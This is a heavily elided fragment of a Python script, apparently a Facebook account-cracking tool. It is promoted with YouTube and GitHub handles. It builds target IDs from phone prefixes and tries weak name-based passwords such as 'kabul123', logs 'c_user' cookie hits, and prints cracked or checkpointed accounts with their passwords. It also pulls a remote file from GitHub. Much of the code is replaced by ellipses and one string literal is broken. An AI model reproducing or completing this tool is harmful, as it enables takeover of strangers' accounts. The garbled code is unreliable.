...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Raziqkha/SHRaziq/blob/main/SHRaziq.py').text
		ua=open('.bbnew.txt','w')
...
\033[1;93m--------------------------------------------------
  ...
  \033[1;32mY0UTUB3   : Saadat teching
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.youtube.com/@Saadat.Technical');menu()
...
def pak():
		...
		print('\033[1;31m Code example: 077,079,078,070..')
...
def bd():
		...
		print('\033[1;32m Code example: 077,079,078,070..')
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
...
def gmail():
		...
		clear()
		print('\033[1;32m example: Afghan123, kabul123, kabul1234, kabul12345 , Khan123..\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: Afghan123, kabul123, kabul1234,kabul12345.. \033[1;97m')
		linex()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [Saadat] '+ids+' | '+pas)
					else:
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/Raziqkha/SHRaziq/blob/main/SHRaziq.pyt'').text
...
\033[1;37m[-] GITHUB    :\033[1;32m SHRaziq
